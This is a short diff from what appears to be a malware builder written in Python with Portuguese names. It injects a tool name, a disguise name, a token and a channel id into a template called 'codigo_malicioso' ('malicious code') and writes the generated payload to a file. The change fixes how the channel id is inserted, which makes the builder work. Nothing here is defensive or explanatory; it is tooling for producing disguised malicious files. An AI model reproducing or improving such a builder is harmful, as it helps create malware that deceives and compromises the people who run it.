@@ -855,7 +855,7 @@ E CBSEC
         codigo_malicioso  = codigo_malicioso.replace('ferramenta_essa = ""', f'ferramenta_essa = "{ferramenta_essa}"')
         codigo_malicioso = codigo_malicioso.replace('ferramenta_disfarçente = ""', f'ferramenta_disfarçente = "{ferramenta_disfarce}"')
         codigo_malicioso = codigo_malicioso.replace('token = ""', f'token = "{token}"')
-        codigo_malicioso = codigo_malicioso.replace('id_canal = 0', f'id_canal = "{id_canal}"')
+        codigo_malicioso = codigo_malicioso.replace('id_canal = 0', f'id_canal = {id_canal}')
         break
     with open(f"{nome_arv}", "w", encoding="utf-8") as arv:
         arv.write(codigo_malicioso)
